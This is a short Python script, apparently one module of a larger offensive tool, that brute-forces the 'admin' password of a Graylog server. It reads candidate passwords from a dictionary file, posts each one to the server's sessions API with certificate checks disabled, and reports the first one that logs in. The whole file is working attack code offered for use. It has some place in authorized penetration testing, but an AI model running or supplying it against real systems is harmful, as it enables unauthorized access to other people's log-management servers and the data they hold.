#!/usr/bin/env python3

# Graylog Login Bruteforce

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import os
import logging
import globals
import requests

# %%%%%%%%%% Functions %%%%%%%%%#


def graylog_brute(ip, port):

	url = \
		globals.http + ip + ":" + str(port) + "/api/system/sessions"
	__location__ = os.path.realpath(os.path.join(
		os.getcwd(), os.path.dirname(__file__)))
	files = open(os.path.join(__location__, 'dict.txt'))
	bruteforcesuccesfull = 0

	for line in files:
		password = line.strip('\n\r')
		params = {
			'username': 'admin',
			'password': password,
			'host': ip}
		headers = {'X-Requested-By': 'XMLHttpRequest'}

		try:
			response = requests.post(
				url, json=params, headers=headers, verify=False)

			if response.status_code == 200:
				globals.messages(7)
				mess = ['admin', password]
				globals.messages(9, mess)
				bruteforcesuccesfull = 1
				files.close()
				break

		except Exception as e:
			logging.error(e, exc_info=True)

	files.close()

	if not bruteforcesuccesfull:
		globals.messages(8)

# %%%%%%%%%% The End %%%%%%%%%%#
